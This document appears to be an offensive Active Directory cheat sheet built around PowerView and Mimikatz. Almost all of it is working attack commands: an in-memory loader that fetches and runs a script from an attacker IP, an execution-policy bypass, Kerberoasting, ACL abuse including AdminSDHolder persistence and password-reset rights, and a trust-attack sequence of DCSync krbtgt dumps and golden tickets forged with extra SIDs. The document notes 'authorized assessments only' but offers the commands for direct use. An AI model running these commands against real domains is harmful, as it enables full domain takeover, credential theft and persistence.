# Import

## Overview

Load from disk or in memory after hosting on the attack machine.

## Commands

    Import-Module .\PowerView.ps1

    # in memory
    iex (iwr -UseBasicParsing http://<attacker IP>/PowerView.ps1)

## Validation / False Positives

Get-Net* vs Get-Domain* indicates 2.x vs 3.x build; mixed tutorials cause command-not-found errors.
Import-Module fails if execution policy blocks scripts; use Set-ExecutionPolicy Bypass -Scope Process first.

# PowerView 3.x Naming

## Overview

HarmJ0y 3.0 naming schema. LDAP/.NET, WMI, and Win32 API backends are indicated by noun prefix.

## Commands

Verbs:
    Get     Retrieve full raw data sets
    Find    Find specific entries in a data set
    Add     Add a new object
    Set     Modify an object
    Invoke  Catch-all for complex actions

Nouns:
    Verb-Domain*     LDAP/.NET queries
    Verb-WMI*        WMI under the hood
    Verb-Net*        Win32 API under the hood

Legacy mapping:
    Find-DomainUserLocation      replaces Invoke-UserHunter
    Find-InterestingDomainShareFile   replaces Invoke-FileFinder
    Get-DomainGPOUserLocalGroupMapping   replaces Find-GPOLocation


# PowerView 3.x Recipes

## Overview

Operational LDAP filters, credential use, Kerberoast, GPO mapping, and ACL abuse. Authorized assessments only.

## Commands

Group membership (recurse up/down):
    Get-DomainGroup -MemberIdentity <user/group>
    Get-DomainGroupMember -Identity "Domain Admins" -Recurse

Alternate credentials:
    $SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $SecPassword)
    Get-DomainUser -Credential $Cred

GPP password hosts:
    Get-DomainOU -GPLink '<GPP_GUID>' | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}

Stale passwords (>1 year):
    $Date = (Get-Date).AddYears(-1).ToFileTime()
    Get-DomainUser -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset

Enabled / disabled users:
    Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname
    Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname
    Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)"
    Get-DomainUser -UACFilter ACCOUNTDISABLE

Smart card required / not required:
    Get-DomainUser -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=262144)"
    Get-DomainUser -UACFilter SMARTCARD_REQUIRED
    Get-DomainUser -LDAPFilter "(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)" -Properties samaccountname
    Get-DomainUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname

Multiple identity types:
    '<SID>', 'CN=<user>,CN=Users,DC=<domain>,DC=<tld>','<GUID>','<samAccountName>' | Get-DomainUser -Properties samaccountname,lastlogoff

Service accounts and Kerberos:
    Get-DomainUser -SPN
    Get-DomainUser -PreauthNotRequired
    Get-DomainUser -UACFilter DONT_REQ_PREAUTH
    Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}
    Get-DomainUser -LDAPFilter '(sidHistory=*)'
    Get-DomainUser -TrustedToAuth
    Get-DomainComputer -TrustedToAuth

Unconstrained delegation:
    $Computers = Get-DomainComputer -Unconstrained
    $Users = Get-DomainUser -AllowDelegation -AdminCount

Local groups on a remote server:
    Get-NetLocalGroup <server>.<domain>
    Get-NetLocalGroupMember -Method API -ComputerName <server>.<domain>

Kerberoast an OU:
    Invoke-Kerberoast -SearchBase "LDAP://OU=<ou>,DC=<domain>,DC=<tld>"

User hunting (3.x):
    Find-DomainUserLocation -ComputerUnconstrained -ShowAll
    Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation

Computers in an OU:
    Get-DomainComputer -SearchBase "ldap://OU=<ou>,DC=<domain>,DC=<tld>"

Logged-on users in server OUs:
    Get-DomainOU -Identity *server* -Domain <domain> | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedon -ComputerName $_}}

Global catalog:
    Get-ForestGlobalCatalog
    gc computers.txt | % {Get-DomainComputer -SearchBase "GC://<forest>" -LDAP "(name=$_)" -Properties dnshostname}

Domain and DC policy:
    $DCPolicy = Get-DomainPolicy -Policy DC
    $DCPolicy.PrivilegeRights
    $DomainPolicy = Get-DomainPolicy -Policy Domain
    $DomainPolicy.KerberosPolicy
    $DomainPolicy.SystemAccess

GPO local group mapping:
    Get-DomainGPOUserLocalGroupMapping -Identity <user/group>
    Get-DomainGPOUserLocalGroupMapping -Identity <user> -Domain <domain> -LocalGroup RDP
    Get-DomainGPOUserLocalGroupMapping | %{$_.computers = $_.computers -join ", "; $_} | Export-CSV -NoTypeInformation gpo_map.csv

Find sensitive files with creds:
    $Password = "<password>" | ConvertTo-SecureString -AsPlainText -Force
    $Credential = New-Object System.Management.Automation.PSCredential("<domain>\<user>",$Password)
    Find-InterestingDomainShareFile -Domain <domain> -Credential $Credential

ACL enumeration and abuse:
    Get-DomainObjectAcl -Identity <user> -ResolveGUIDs -Domain <domain>
    Add-DomainObjectAcl -TargetIdentity <user> -PrincipalIdentity <user> -Rights ResetPassword -Verbose
    Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=<domain>,DC=<tld>' -ResolveGUIDs
    Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<domain>,DC=<tld>' -PrincipalIdentity <user> -Rights All

DCSync rights (replication ACLs):
    Get-DomainObjectAcl "dc=<domain>,dc=<tld>" -ResolveGUIDs | ? {
        ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
    }

Linked domain admin correlation:
    Get-DomainGroupMember 'Domain Admins' | %{Get-DomainUser $_.membername -LDAPFilter '(displayname=*)'} | %{$a=$_.displayname.split(' ')[0..1] -join ' '; Get-DomainUser -LDAPFilter "(displayname=*$a*)" -Properties displayname,samaccountname}

Save and reload objects:
    Get-DomainUser | Export-Clixml user.xml
    $Users = Import-Clixml user.xml

Machine accounts in privileged groups:
    Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'}

GPO modification rights:
    Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}

GPOs applied to a machine:
    Get-DomainGPO -ComputerIdentity <host>.<domain>

Non-global groups:
    Get-DomainGroup -GroupScope NotGlobal -Properties name

Foreign principals in global catalog:
    $ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase "GC://<domain>" -LDAPFilter '(objectclass=foreignSecurityPrincipal)' | ? {$_.objectsid -match '^S-1-5-.*-[1-9]\d{2,}$'} | Select-Object -ExpandProperty distinguishedname

Impersonation (-sta mode):
    $SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $SecPassword)
    Invoke-UserImpersonation -Credential $Cred
    Invoke-RevertToSelf

Outlier computer properties:
    Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier

Set object properties and owner:
    Set-DomainObject <user> -Set @{'mstsinitialprogram'='\\<host>\program.exe'} -Verbose
    Set-DomainObjectOwner -Identity <user> -OwnerIdentity <owner>

## Validation / False Positives

Kerberoast output requires accounts with SPNs and a crackable encryption type; no output may mean none set or AES-only service accounts.
DCSync ACL queries return candidates, not proof of replicable creds; confirm with actual dcsync in a controlled lab.
AdminSDHolder and ResetPassword examples modify AD; use only with explicit authorization.


# Trust Attack Demo

## Overview

HarmJ0y 44con_demo.ps1 narrative: map trusts, foreign groups, child-domain krbtgt, golden ticket across trust. Lab script reference only.

## Commands

    Import-Module .\powerview.ps1
    Import-Module .\mimikatz.ps1

    Invoke-MapDomainTrust

    Find-ForeignGroup -Domain <external.domain>
    Find-ForeignGroup -Domain <external.domain> | Select-Object -ExpandProperty UserName | Convert-SidToName

    Get-NetUser <user> -Domain <domain>
    Get-NetGroup -UserName <user> -Domain <domain> | Convert-NameToSid | fl

    Invoke-Mimikatz -Command '"lsadump::dcsync /user:<child>\krbtgt"'

    "<child>\krbtgt" | Convert-NameToSid | fl
    "<parent>\krbtgt" | Convert-NameToSid | fl

    Invoke-Mimikatz -Command '"kerberos::golden /user:<user> /domain:<child.domain> /sid:<child-domain-sid> /krbtgt:<krbtgt-hash> /sids:<enterprise-admins-sid> /ptt"'

    Get-NetDomainController -Domain <parent.domain>
    dir \\<DC>.<parent.domain>\C$

    Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<parent.domain> /user:<parent>\krbtgt"'
    Invoke-Mimikatz -Command '"kerberos::purge"'

    Invoke-Mimikatz -Command '"kerberos::golden /user:<user> /domain:<parent.domain> /id:<rid> /groups:<group-rids> /sid:<domain-sid> /krbtgt:<krbtgt-hash> /ptt"'

    Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<external.domain> /user:<external>\krbtgt"'
